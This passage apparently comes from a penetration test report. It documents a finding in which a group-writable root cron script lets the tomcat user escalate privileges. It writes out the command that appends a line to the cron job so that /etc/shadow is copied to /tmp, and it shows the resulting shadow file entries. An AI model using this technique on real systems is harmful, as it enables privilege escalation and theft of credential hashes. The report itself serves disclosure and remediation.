The tomcat user had write access to the file /etc/cron.daily/tomcat.cron. The contents of this file were executed in the context of the root super-user account. 
Consequently, given command execution (see above), arbitrary commands could be scheduled for execution as root.

$ ls -al /etc/cron.daily/tomcat.cron

-rwxrwxr-x 1 root tomcat 88 Jul  6 03:58 /etc/cron.daily/tomcat.cron

As the tomcat user, it was possible to append additional content to the cron job. For example, with the command below:

$ echo ‘cat /etc/shadow >/tmp/shadow’ >> /etc/cron.daily/tomcat.cron

This cron job was executed daily and ran with root privileges.

$ ls -l /tmp/shadow

-rw-r—r— 1 root root 825 Jul  6 04:02 /tmp/shadow

$ cat /tmp/shadow

root:!!:16612:0:99999:7:::
bin:*:16612:0:99999:7:::
daemon:*:16612:0:99999:7:::
